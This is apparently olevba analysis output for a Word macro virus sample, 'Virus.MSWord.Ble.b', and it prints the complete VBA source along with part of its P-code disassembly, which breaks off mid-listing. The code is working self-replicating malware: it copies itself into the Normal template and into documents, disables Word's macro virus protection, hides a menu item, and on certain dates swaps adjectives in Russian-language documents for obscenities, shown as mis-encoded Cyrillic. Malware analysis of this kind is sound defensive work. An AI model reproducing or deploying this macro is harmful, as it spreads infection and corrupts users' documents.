olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ble.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ble.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MacroBle.bas 
in file: Virus.MSWord.Ble.b - OLE stream: 'Macros/VBA/MacroBle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public myname$
Public Changed As Boolean
Option Base 1
Dim ends$(2, 12)
Dim Moora1$(40)
Dim Moora2$(10)
Dim Miss$(8)



'  Macro Ble - the Virus.
' It''s very simple trick. Don''t be surprize: it's a first module i
'  wrote in Visual Basic in my life !

Sub AutoOpen()
 On Error GoTo 1
 myname$ = "MacroBle"
 WordBasic.DisableAutoMacros 0
 
 If Not CheckNormal Then
  Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
  Set mytemp = NormalTemplate.OpenAsDocument
  mytemp.SaveAs (GetPath$ + "NORMAL1.DOT")
  mytemp.Close savechanges:=wdSaveChanges
End If
GoTo 2
1:
 'MsgBox "Fuck up !"
 Resume 2
2:
End Sub
Function CheckNormal()
 cn = False
 For Each x In NormalTemplate.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckNormal = cn
End Function

Function CheckActive()
 cn = False
 For Each x In ActiveDocument.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckActive = cn
 End Function

Sub AutoClose()
 On Error GoTo errorlevel2
 If Not CheckActive Then Application.OrganizerCopy Source:=GetPath$ + "NORMAL1.DOT", Destination:=ActiveDocument.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
 If MyDate Then MakeSoviet
 GoTo end_f
errorlevel2:
 'MsgBox "More Errors !"
 Resume end_f
end_f:
End Sub

Function GetPath$()
 s$ = NormalTemplate.FullName
 s$ = Mid$(s$, 1, Len(s$) - 10)
 GetPath$ = s$
End Function

Sub AutoExec()
 Options.VirusProtection = False
 Set x = CommandBars("Tools").Controls(12)
 x.Visible = False
 x.Enabled = False
 ends$(1, 1) = "űé"
 ends$(1, 2) = "îăî"
 ends$(1, 3) = "îěó"
 ends$(1, 4) = "űě"
 ends$(1, 5) = "îě"
 ends$(1, 6) = "ŕ˙"
 ends$(1, 7) = "îé"
 ends$(1, 8) = "óţ"
 ends$(1, 9) = "űĺ"
 ends$(1, 10) = "űő"
 ends$(1, 11) = "űěč"
 ends$(1, 12) = "îĺ"
 ends$(2, 1) = "čé"
 ends$(2, 2) = "ĺăî"
 ends$(2, 3) = "ĺěó"
 ends$(2, 4) = "čě"
 ends$(2, 5) = "ĺě"
 ends$(2, 6) = "ĺé"
 ends$(2, 7) = "čĺ"
 ends$(2, 8) = "čő"
 ends$(2, 9) = "čě"
 ends$(2, 10) = "čěč"
 ends$(2, 11) = "ĺĺ"
 ends$(2, 12) = "ŕ˙"
 
 Moora1$(1) = "őóĺâ"
 Moora1$(2) = "ĺáŕíóň"
 Moora1$(3) = "ăîíčě"
 Moora1$(4) = "äĺáčëüí"
 Moora1$(5) = "ěóäŕ÷í"
 Moora1$(6) = "őđĺíîâ"
 Moora1$(7) = "äóáîâ"
 Moora1$(8) = "ńîďëčâ"
 Moora1$(9) = "ęîđ˙â"
 Moora1$(10) = "óáëţäî÷í"
 
 Moora1$(11) = "ďĺäđčëüí"
 Moora1$(12) = "ăîâí˙í"
 Moora1$(13) = "ęîçëčí"
 Moora1$(14) = "ĺáëčâ"
 Moora1$(15) = "ĺáŕí"
 Moora1$(16) = "ďčçäŕíóň"
 Moora1$(17) = "ďđčäóđîří"
 Moora1$(18) = "řčçŕíóň"
 Moora1$(19) = "ăíóńí"
 Moora1$(20) = "ńňđĺěí"
 
 Moora1$(21) = "ăíóńŕâ"
 Moora1$(22) = "ňóďîđűë"
 Moora1$(23) = "ęŕíŕëčçŕöčîíí"
 Moora1$(24) = "âčçăëčâ"
 Moora1$(25) = "ńëĺďîřŕđ"
 Moora1$(26) = "ďđűůŕâ"
 Moora1$(27) = "đâîňí"
 Moora1$(28) = "ńęëî÷í"
 Moora1$(29) = "óđîäëčâ"
 Moora1$(30) = "áîđîäŕâî÷í"
 
 Moora1$(31) = "îáńňđóőŕíí"
 Moora1$(32) = "íĺíîđěŕëüí"
 Moora1$(33) = "ďëţăŕâ"
 Moora1$(34) = "ęîń˙÷í"
 Moora1$(35) = ""
 Moora1$(36) = ""
 Moora1$(37) = ""
 Moora1$(38) = ""
 Moora1$(39) = ""
 Moora1$(40) = ""

 Moora2$(1) = "ńâčí˙÷"
 Moora2$(2) = "îőóĺâř"
 Moora2$(3) = "âîíţ÷"
 Moora2$(4) = "îőóĺâŕţů"
 Moora2$(5) = ""
 Moora2$(6) = ""
 Moora2$(7) = ""
 Moora2$(8) = ""
 Moora2$(9) = ""
 Moora2$(10) = ""
 
 Miss$(1) = "ěí"
 Miss$(2) = "ňîá"
 Miss$(3) = "ńîá"
 Miss$(4) = "ńâî"
 Miss$(5) = "ěî"
 Miss$(6) = "čőí"
 Miss$(7) = "íŕř"
 Miss$(8) = "âŕř"
End Sub

Sub MakeSoviet()
 AutoExec
 Randomize Timer
 f = System.LanguageDesignation
 If UCase$(Mid$(f, 1, 3)) = "ĐÓŃ" Then
  s = ActiveDocument.Words.Count
  If s < 200 Then effects = True Else effects = False
  For k = 1 To s
   If effects Then
    LastFont = ActiveDocument.Words(k).Font.Size
    ActiveDocument.Words(k).Font.Size = LastFont + 2
   End If
   tss$ = ActiveDocument.Words.Item(k)
   Changed = False
   If Len(tss$) > 4 Then tss$ = TrunslateWord(tss$)
   If Changed Then ActiveDocument.Words(k) = tss$
   If effects Then ActiveDocument.Words(k).Font.Size = LastFont
   Next k
  End If
End Sub

Function TrunslateWord$(ts As String)
 tw$ = ts
 Spaces = CheckSpace(ts)
 If Spaces <> 0 Then ts = Mid$(ts, 1, Len(ts) - Spaces)
 If Len(ts) > 4 Then
  If CheckAdjective(ts) Then
   c = 1
   While c <= 2
    I = 1
    While I <= 12
     CEnd$ = ends$(c, I)
     MyEnd$ = Mid$(ts, Len(ts) - Len(CEnd$) + 1, Len(CEnd$))
     If MyEnd$ = CEnd$ Then
      Changed = True
      Select Case c
       Case 1
        tw$ = Moora1$(Int(34 * Rnd + 1)) + CEnd$
       Case 2
        tw$ = Moora2$(Int(3 * Rnd + 1)) + CEnd$
      End Select
      If Spaces <> 0 Then
       For m = 1 To Spaces
        tw$ = tw$ + " "
       Next m
      End If
      If CapFirst(ts) Then tw$ = UCase$(Mid$(tw$, 1, 1)) + Mid$(tw$, 2, Len(tw$) - 1)
      I = 12
      c = 2
     End If
     I = I + 1
    Wend
    c = c + 1
   Wend
  End If
 End If
 TrunslateWord$ = tw$
End Function

Function CheckSpace(csp As String) As Integer
 spp = 0
 n = Len(csp)
 If n > 3 Then
  While (Mid$(csp, n, 1) = " ") And (n > 3)
   n = n - 1
   spp = spp + 1
  Wend
 End If
 CheckSpace = spp
End Function

Function CapFirst(cf As String) As Boolean
 cfs = False
 If UCase$(Mid$(cf, 1, 1)) = Mid$(cf, 1, 1) Then cfs = True
 CapFirst = cfs
End Function

Function CheckDoubleN_Miss(cdn As String) As Boolean
 cdbn = False
 If Len(cdn) >= 4 Then
  st3$ = Mid$(cdn, 1, Len(cdn) - 3)
  st2$ = Mid$(cdn, 1, Len(cdn) - 2)
  If Len(cdn) > 5 Then
   lst2$ = Mid$(st2$, Len(st2$) - 1, 2)
   lst3$ = Mid$(st3$, Len(st3$) - 1, 2)
  End If
  missed = False
  f = 1
  While f <= 8
   If st2$ = Miss$(f) Then missed = True
   If st3$ = Miss$(f) Then missed = True
   If missed Then f = 8
   f = f + 1
  Wend
  If lst2$ = "íí" Or lst3$ = "íí" Or missed Then cdbn = True
 End If
 CheckDoubleN_Miss = cdbn
End Function

Function MyDate() As Boolean
 dt$ = Date$
 If InStr(1, dt$, "15") <> 0 Then MyDate = True Else MyDate = False
End Function


Function CheckAdjective(adj As String) As Boolean
 cadj = False
 Set mySynInfo = SynonymInfo(adj)
 myPos = mySynInfo.PartOfSpeechList
 I = UBound(myPos)
 If I >= 1 Then If myPos(1) = wdAdjective Then cadj = True
 CheckAdjective = cadj
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ble.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/MacroBle - 13413 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn myname
' Line #1:
' 	Dim (Public) 
' 	VarDefn Changed (As Boolean)
' Line #2:
' 	Option  (Base 1)
' Line #3:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0002 
' 	OptionBase 
' 	LitDI2 0x000C 
' 	VarDefn ends
' Line #4:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0028 
' 	VarDefn Moora1
' Line #5:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn Moora2
' Line #6:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0008 
' 	VarDefn Miss
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' 	QuoteRem 0x0000 0x0018 "  Macro Ble - the Virus."
' Line #11:
' 	QuoteRem 0x0000 0x0043 " It''s very simple trick. Don''t be surprize: it's a first module i"
' Line #12:
' 	QuoteRem 0x0000 0x0024 "  wrote in Visual Basic in my life !"
' Line #13:
' Line #14:
' 	FuncDefn (Sub AutoOpen())
' Line #15:
' 	OnError 1 
' Line #16:
' 	LitStr 0x0008 "MacroBle"
' 	St myname$ 
' Line #17:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #18:
' Line #19:
' 	Ld CheckNormal 
' 	Not 
' 	IfBlock 
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld myname$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #21:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	Set mytemp 
' Line #22:
' 	Ld GetPath$ 
' 	LitStr 0x000B "NORMAL1.DOT"
' 	Add 
' 	Paren 
' 	Ld mytemp 
' 	ArgsMemCall SaveAs 0x0001 
' Line #23:
' 	Ld wdSaveChanges 
' 	ParamNamed savechanges 
' 	Ld mytemp 
' 	ArgsMemCall Close 0x0001 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	GoTo 2 
' Line #26:
' 	LineNum 1 
' 	BoS 0x0000 
' Line #27:
' 	QuoteRem 0x0001 0x0012 "MsgBox "Fuck up !""
' Line #28:
' 	Resume 2 
' Line #29:
' 	LineNum 2 
' 	BoS 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Function CheckNormal())
' Line #32:
' 	LitVarSpecial (False)
' 	St cn 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #34:
' 	Ld x 
' 	MemLd New 
' 	Ld myname$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cn 
' 	EndIf 
' Line #35:
' 	StartForVariable 
' 	Next 
' Line #36:
' 	Ld cn 
' 	St CheckNormal 
' Line #37:
' 	EndFunc 
' Line #38:
' Line #39:
' 	FuncDefn (Function CheckActive())
' Line #40:
' 	LitVarSpecial (False)
' 	St cn 
' Line #41:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #42:
' 	Ld x 
' 	MemLd New 
' 	Ld myname$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cn 
' 	EndIf 
' Line #43:
' 	StartForVariable 
' 	Next 
' Line #44:
' 	Ld cn 
' 	St CheckActive 
' Line #45:
' 	EndFunc 
' Line #46:
' Line #47:
' 	FuncDefn (Sub AutoClose())
' Line #48:
' 	OnError errorlevel2 
' Line #49:
' 	Ld CheckActive 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld GetPath$ 
' 	LitStr 0x000B "NORMAL1.DOT"
' 	Add 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld myname$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	EndIf 
' Line #50:
' 	Ld MyDate 
' 	If 
' 	BoSImplicit 
' 	ArgsCall MakeSoviet 0x0000 
' 	EndIf 
' Line #51:
' 	GoTo end_f 
' Line #52:
' 	Label errorlevel2 
' Line #53:
' 	QuoteRem 0x0001 0x0016 "MsgBox "More Errors !""
' Line #54:
' 	Resume end_f 
' Line #55:
' 	Label end_f 
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Function GetPath())
' Line #59:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St s$ 
' Line #60:
' 	Ld s$ 
' 	LitDI2 0x0001 
' 	Ld s$ 
' 	FnLen 
' 	LitDI2 0x000A 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St s$ 
' Line #61:
' 	Ld s$ 
' 	St GetPath$ 
' Line #62:
' 	EndFunc 
' Line #63:
' Line #64:
' 	FuncDefn (Sub AutoExec())
' Line #65:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #66:
' 	SetStmt 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	Set x 
' Line #67:
' 	LitVarSpecial (False)
' 	Ld x 
' 	MemSt Visible 
' Line #68:
' 	LitVarSpecial (False)
' 	Ld x 
' 	MemSt Enabled 
' Line #69:
' 	LitStr 0x0002 "űé"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt ends$ 0x0002 
' Line #70:
' 	LitStr 0x0003 "îăî"
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsSt ends$ 0x0002 
' Line #71:
' 	LitStr 0x0003 "îěó"
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsSt ends$ 0x0002 
' Line #72:
' 	LitStr 0x0002 "űě"
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsSt ends$ 0x0002 
' Line #73:
' 	LitStr 0x0002 "îě"
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsSt ends$ 0x0002 
' Line #74:
' 	LitStr 0x0002 "ŕ˙"
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	ArgsSt ends$ 0x0002 
' Line #75:
' 	LitStr 0x0002 "îé"
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	ArgsSt ends$ 0x0002 
' Line #76:
' 	LitStr 0x0002 "óţ"
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsSt ends$ 0x0002 
' Line #77:
' 	LitStr 0x0002 "űĺ"
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	ArgsSt ends$ 0x0002 
' Line #78:
' 	LitStr 0x0002 "űő"
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	ArgsSt ends$ 0x0002 
' Line #79:
' 	LitStr 0x0003 "űěč"
' 	LitDI2 0x0001 
' 	LitDI2 0x000B 
' 	ArgsSt ends$ 0x0002 
' Line #80:
' 	LitStr 0x0002 "îĺ"
' 	LitDI2 0x0001 
' 	LitDI2 0x000C 
' 	ArgsSt ends$ 0x0002 
' Line #81:
' 	LitStr 0x0002 "čé"
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt ends$ 0x0002 
' Line #82:
' 	LitStr 0x0003 "ĺăî"
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	ArgsSt ends$ 0x0002 
' Line #83:
' 	LitStr 0x0003 "ĺěó"
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsSt ends$ 0x0002 
' Line #84:
' 	LitStr 0x0002 "čě"
' 	LitDI2 0x0002 
' 	LitDI2 0x0004 
' 	ArgsSt ends$ 0x0002 
' Line #85:
' 	LitStr 0x0002 "ĺě"
' 	LitDI2 0x0002 
' 	LitDI2 0x0005 
' 	ArgsSt ends$ 0x0002 
' Line #86:
' 	LitStr 0x0002 "ĺé"
' 	LitDI2 0x0002 
' 	LitDI2 0x0006 
' 	ArgsSt ends$ 0x0002 
' Line #87:
' 	LitStr 0x0002 "čĺ"
' 	LitDI2 0x0002 
' 	LitDI2 0x0007 
' 	ArgsSt ends$ 0x0002 
' Line #88:
' 	LitStr 0x0002 "čő"
' 	LitDI2 0x0002 
' 	LitDI2 0x0008 
' 	ArgsSt ends$ 0x0002 
' Line #89:
' 	LitStr 0x0002 "čě"
' 	LitDI2 0x0002 
' 	LitDI2 0x0009 
' 	ArgsSt ends$ 0x0002 
' Line #90:
' 	LitStr 0x0003 "čěč"
' 	LitDI2 0x0002 
' 	LitDI2 0x000A 
' 	ArgsSt ends$ 0x0002 
' Line #91:
' 	LitStr 0x0002 "ĺĺ"
' 	LitDI2 0x0002 
' 	LitDI2 0x000B 
' 	ArgsSt ends$ 0x0002 
' Line #92:
' 	LitStr 0x0002 "ŕ˙"
' 	LitDI2 0x0002 
' 	LitDI2 0x000C 
' 	ArgsSt ends$ 0x0002 
' Line #93:
' Line #94:
' 	LitStr 0x0004 "őóĺâ"
' 	LitDI2 0x0001 
' 	ArgsSt Moora1$ 0x0001 
' Line #95:
' 	LitStr 0x0006 "ĺáŕíóň"
' 	LitDI2 0x0002 
' 	ArgsSt Moora1$ 0x0001 
' Line #96:
' 	LitStr 0x0005 "ăîíčě"
' 	LitDI2 0x0003 
' 	ArgsSt Moora1$ 0x0001 
' Line #97:
' 	LitStr 0x0007 "äĺáčëüí"
' 	LitDI2 0x0004 
' 	ArgsSt Moora1$ 0x0001 
' Line #98:
' 	LitStr 0x0006 "ěóäŕ÷í"
' 	LitDI2 0x0005 
' 	ArgsSt Moora1$ 0x0001 
' Line #99:
' 	LitStr 0x0006 "őđĺíîâ"
' 	LitDI2 0x0006 
' 	ArgsSt Moora1$ 0x0001 
' Line #100:
' 	LitStr 0x0005 "äóáîâ"
' 	LitDI2 0x0007 
' 	ArgsSt Moora1$ 0x0001 
' Line #101:
' 	LitStr 0x0006 "ńîďëčâ"
' 	LitDI2 0x0008 
' 	ArgsSt Moora1$ 0x0001 
' Line #102:
' 	LitStr 0x0005 "ęîđ˙â"
' 	LitDI2 0x0009 
' 	ArgsSt Moora1$ 0x0001 
' Line #103:
' 	LitStr 0x0008 "óáëţäî÷í"
' 	LitDI2 0x000A 
' 	ArgsSt Moora1$ 0x0001 
' Line #104:
' Line #105:
' 	LitStr 0x0008 "ďĺäđčëüí"
' 	LitDI2 0x000B 
' 	ArgsSt Moora1$ 0x0001 
' Line #106:
' 	LitStr 0x0006 "ăîâí˙í"
' 	LitDI2 0x000C 
' 	ArgsSt Moora1$ 0x0001 
' Line #107:
' 	LitStr 0x0006 "ęîçëčí"
' 	LitDI2 0x000D 
' 	ArgsSt Moora1$ 0x0001 
' Line #108:
' 	LitStr 0x0005 "ĺáëčâ"
' 	LitDI2 0x000E 
' 	ArgsSt Moora1$ 0x0001 
' Line #109:
' 	LitStr 0x0004 "ĺáŕí"
' 	LitDI2 0x000F 
' 	ArgsSt Moora1$ 0x0001 
' Line #110:
' 	LitStr 0x0008 "ďčçäŕíóň"
' 	LitDI2 0x0010 
' 	ArgsSt Moora1$ 0x0001 
' Line #111:
' 	LitStr 0x0009 "ďđčäóđîří"
' 	LitDI2 0x0011 
' 	ArgsSt Moora1$ 0x0001 
' Line #112:
' 	LitStr 0x0007 "řčçŕíóň"
' 	LitDI2 0x0012 
' 	ArgsSt Moora1$ 0x0001 
' Line #113:
' 	LitStr 0x0005 "ăíóńí"
' 	LitDI2 0x0013 
' 	ArgsSt Moora1$ 0x0001 
' Line #114:
' 	LitStr 0x0006 "ńňđĺěí"
' 	LitDI2 0x0014 
' 	ArgsSt Moora1$ 0x0001 
' Line #115:
' Line #116:
' 	LitStr 0x0006 "ăíóńŕâ"
' 	LitDI2 0x0015 
' 	ArgsSt Moora1$ 0x0001 
' Line #117:
' 	LitStr 0x0007 "ňóďîđűë"
' 	LitDI2 0x0016 
' 	ArgsSt Moora1$ 0x0001 
' Line #118:
' 	LitStr 0x000D "ęŕíŕëčçŕöčîíí"
' 	LitDI2 0x0017 
' 	ArgsSt Moora1$ 0x0001 
' Line #119:
' 	LitStr 0x0007 "âčçăëčâ"
' 	LitDI2 0x0018 
' 	ArgsSt Moora1$ 0x0001 
' Line #120:
' 	LitStr 0x0008 "ńëĺďîřŕđ"
' 	LitDI2 0x0019 
' 	ArgsSt Moora1$ 0x0001 
' Line #121:
' 	LitStr 0x0006 "ďđűůŕâ"
' 	LitDI2 0x001A 
' 	ArgsSt Moora1$ 0x0001 
' Line #122:
' 	LitStr 0x0005 "đâîňí"
' 	LitDI2 0x001B 
' 	ArgsSt Moora1$ 0x0001 
' Line #123:
' 	LitStr 0x0006 "ńęëî÷í"
' 	LitDI2 0x001C 
' 	ArgsSt Moora1$ 0x0001 
' Line #124:
' 	LitStr 0x0007 "óđîäëčâ"
' 	LitDI2 0x001D 
' 	ArgsSt Moora1$ 0x0001 
' Line #125:
' 	LitStr 0x000A "áîđîäŕâî÷í"
' 	LitDI2 0x001E 
' 	ArgsSt Moora1$ 0x0001 
' Line #126:
' Line #127:
' 	LitStr 0x000A "îáńňđóőŕíí"
' 	LitDI2 0x001F 
' 	ArgsSt Moora1$ 0x0001 
' Line #128:
' 	LitStr 0x000A "íĺíîđěŕëüí"
' 	LitDI2 0x0020 
' 	ArgsSt Moora1$ 0x0001 
' Line #129:
' 	LitStr 0x0006 "ďëţăŕâ"
' 	LitDI2 0x0021 
' 	ArgsSt Moora1$ 0x0001 
' Line #130:
' 	LitStr 0x0006 "ęîń˙÷í"
' 	LitDI2 0x0022 
' 	ArgsSt Moora1$ 0x0001 
' Line #131:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0023 
' 	ArgsSt Moora1$ 0x0001 
' Line #132:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0024 
' 	ArgsSt Moora1$ 0x0001 
' Line #133:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0025 
' 	ArgsSt Moora1$ 0x0001 
' Line #134:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0026 
' 	ArgsSt Moora1$ 0x0001 
' Line #135:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0027 
' 	ArgsSt Moora1$ 0x0001 
' Line #136:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0028 
' 	ArgsSt Moora1$ 0x0001 
' Line #137:
' Line #138:
' 	LitStr 0x0006 "ńâčí˙÷"
' 	LitDI2 0x0001 
' 	ArgsSt Moora2$ 0x0001 
' Line #139:
' 	LitStr 0x0006 "îőóĺâř"
' 	LitDI2 0x0002 
' 	ArgsSt Moora2$ 0x0001 
' Line #140:
' 	LitStr 0x0005 "âîíţ÷"
' 	LitDI2 0x0003 
' 	ArgsSt Moora2$ 0x0001 
' Line #141:
' 	LitStr 0x0008 "îőóĺâŕţů"
' 	LitDI2 0x0004 
' 	ArgsSt Moora2$ 0x0001 
' Line #142:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0005 
' 	ArgsSt Moora2$ 0x0001 
' Line #143:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0006 
' 	ArgsSt Moora2$ 0x0001 
' Line #144:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0007 
' 	ArgsSt Moora2$ 0x0001 
' Line #145:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0008 
' 	ArgsSt Moora2$ 0x0001 
' Line #146:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0009 
' 	ArgsSt Moora2$ 0x0001 
' Line #147:
' 	LitStr 0x0000 ""
' 	LitDI2 0x000A 
' 	ArgsSt Moora2$ 0x0001 
' Line #148:
' Line #149:
' 	LitStr 0x0002 "ěí"
' 	LitDI2 0x0001 
' 	ArgsSt Miss$ 0x0001 
' Line #150:
' 	LitStr 0x0003 "ňîá"
' 	LitDI2 0x0002 
' 	ArgsSt Miss$ 0x0001 
' Line #151:
' 	LitStr 0x0003 "ńîá"
' 	LitDI2 0x0003 
' 	ArgsSt Miss$ 0x0001 
' Line #152:
' 	LitStr 0x0003 "ńâî"
' 	LitDI2 0x0004 
' 	ArgsSt Miss$ 0x0001 
' Line #153:
' 	LitStr 0x0002 "ěî"
' 	LitDI2 0x0005 
' 	ArgsSt Miss$ 0x0001 
' Line #154:
' 	LitStr 0x0003 "čőí"
' 	LitDI2 0x0006 
' 	ArgsSt Miss$ 0x0001 
' Line #155:
' 	LitStr 0x0003 "íŕř"
' 	LitDI2 0x0007 
' 	ArgsSt Miss$ 0x0001 
' Line #156:
' 	LitStr 0x0003 "âŕř"
' 	LitDI2 0x0008 
' 	ArgsSt Miss$ 0x0001 
' Line #157:
' 	EndSub 
' Line #158:
' Line #159:
' 	FuncDefn (Sub MakeSoviet())
' Line #160:
' 	ArgsCall AutoExec 0x0000 
' Line #161:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #162:
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	St False 
' Line #163:
' 	Ld False 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd UCase$ 0x0001 
' 	LitStr 0x0003 "ĐÓŃ"
' 	Eq 
' 	IfBlock 
' Line #164:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	St s 
' Line #165:
' 	Ld s 
' 	LitDI2 0x00C8 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St effects 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St effects 
' 	EndIf 
' Line #166:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	For 
' Line #167:
' 	Ld effects 
' 	IfBlock 
' Line #168:
' 	Ld k 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Font 
' 	MemLd Size 
' 	St LastFont 
' Line #169:
' 	Ld LastFont 
' 	LitDI2 0x0002 
' 	Add 
' 	Ld k 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Font 
' 	MemSt Size 
' Line #170:
' 	EndIfBlock 
' Line #171:
' 	Ld k 
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	ArgsMemLd Item 0x0001 
' 	St tss$ 
' Line #172:
' 	LitVarSpecial (False)
' 	St Changed 
' Line #173:
' 	Ld tss$ 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld tss$ 
' 	ArgsLd TrunslateWord 0x0001 
' 	St tss$ 
' 	EndIf 
' Line #174:
' 	Ld Changed 
' 	If 
' 	BoSImplicit 
' 	Ld tss$ 
' 	Ld k 
' 	Ld ActiveDocument 
' 	ArgsMemSt Words 0x0001 
' 	EndIf 
' Line #175:
' 	Ld effects 
' 	If 
' 	BoSImplicit 
' 	Ld LastFont 
' 	Ld k 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	MemLd Font 
' 	MemSt Size 
' 	EndIf 
' Line #176:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #177:
' 	EndIfBlock 
' Line #178:
' 	EndSub 
' Line #179:
' Line #180:
' 	FuncDefn (Function TrunslateWord(ts As String))
' Line #181:
' 	Ld ts 
' 	St tw$ 
' Line #182:
' 	Ld ts 
' 	ArgsLd CheckSpace 0x0001 
' 	St Spaces 
' Line #183:
' 	Ld Spaces 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ts 
' 	LitDI2 0x0001 
' 	Ld ts 
' 	FnLen 
' 	Ld Spaces 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St ts 
' 	EndIf 
' Line #184:
' 	Ld ts 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Gt 
' 	IfBlock 
' Line #185:
' 	Ld ts 
' 	ArgsLd CheckAdjective 0x0001 
' 	IfBlock 
' Line #186:
' 	LitDI2 0x0001 
' 	St c 
' Line #187:
' 	Ld c 
' 	LitDI2 0x0002 
' 	Le 
' 	While 
' Line #188:
' 	LitDI2 0x0001 
' 	St I 
' Line #189:
' 	Ld I 
' 	LitDI2 0x000C 
' 	Le 
' 	While 
' Line #190:
' 	Ld c 
' 	Ld I 
' 	ArgsLd ends$ 0x0002 
' 	St CEnd$ 
' Line #191:
' 	Ld ts 
' 	Ld ts 
' 	FnLen 
